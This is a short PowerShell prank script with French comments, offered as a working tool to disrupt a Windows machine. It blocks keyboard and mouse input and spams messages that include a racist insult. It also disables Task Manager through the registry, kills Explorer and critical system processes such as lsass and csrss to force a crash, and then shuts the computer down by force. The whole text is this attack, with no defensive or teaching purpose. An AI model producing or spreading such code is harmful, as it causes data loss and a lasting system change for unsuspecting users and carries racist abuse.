Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
}
"@ -Language CSharp

# Bloque le clavier/souris pour empêcher la fermeture du script
[Win32]::BlockInput($true)

# Spamme des MsgBox trollantes
for ($i=0; $i -lt 30; $i++) {
    msg * "😈 Ta maman la chinoise !"
    msg * "🤣 Impossible de fermer cette fenêtre !"
    msg * "💀 Windows est sur le point de DIE"
}

Start-Sleep -Seconds 3

# Désactive Ctrl+Alt+Del pour empêcher la fermeture de session
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

# Tue l'Explorateur Windows
Stop-Process -Name explorer -Force

# Tue des processus critiques de Windows pour forcer un crash
Stop-Process -Name svchost -Force
Stop-Process -Name lsass -Force
Stop-Process -Name wininit -Force
Stop-Process -Name csrss -Force

# Crash instantané du système
shutdown /s /f /t 0
